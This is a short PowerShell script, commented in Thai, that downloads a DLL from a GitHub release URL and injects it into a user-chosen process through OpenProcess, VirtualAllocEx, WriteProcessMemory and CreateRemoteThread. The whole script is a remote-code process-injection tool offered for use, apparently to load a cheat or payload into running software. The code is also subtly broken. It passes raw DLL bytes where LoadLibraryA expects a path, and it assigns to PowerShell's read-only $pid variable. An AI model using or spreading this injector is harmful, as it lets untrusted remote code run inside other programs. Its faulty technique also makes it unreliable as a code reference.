# ดาวน์โหลด DLL
$dllUrl = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1.dll"
$webClient = New-Object System.Net.WebClient
$dllBytes = $webClient.DownloadData($dllUrl)

# รับ PID จากผู้ใช้
Write-Host "Enter PID : " -ForegroundColor Yellow
$input = Read-Host
$pid = [int]$input

# ตรวจสอบว่า PID มีอยู่จริง
$processExists = Get-Process -Id $pid -ErrorAction SilentlyContinue
if (-not $processExists) {
    Write-Host "Process with PID $pid not found!" -ForegroundColor Red
    exit
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
}
"@

$PROCESS_ALL_ACCESS = 0x1F0FFF
$hProcess = [Injector]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)

if ($hProcess -eq 0) {
    Write-Host "Failed to open process. Try running as Administrator." -ForegroundColor Red
    exit
}

$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04

$remoteBuffer = [Injector]::VirtualAllocEx($hProcess, 0, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

if ($remoteBuffer -eq 0) {
    Write-Host "Failed to allocate memory in target process." -ForegroundColor Red
    [Injector]::CloseHandle($hProcess)
    exit
}

$bytesWritten = [UIntPtr]::Zero
[Injector]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref] $bytesWritten)

$kernel32 = [Injector]::GetProcAddress([Injector]::LoadLibrary("kernel32.dll"), "LoadLibraryA")
$threadHandle = [Injector]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remoteBuffer, 0, 0)

if ($threadHandle -ne 0) {
    Write-Host "Successfully injected into PID: $pid" -ForegroundColor Green
    [Injector]::CloseHandle($threadHandle)
} else {
    Write-Host "Injection failed." -ForegroundColor Red
}

[Injector]::CloseHandle($hProcess)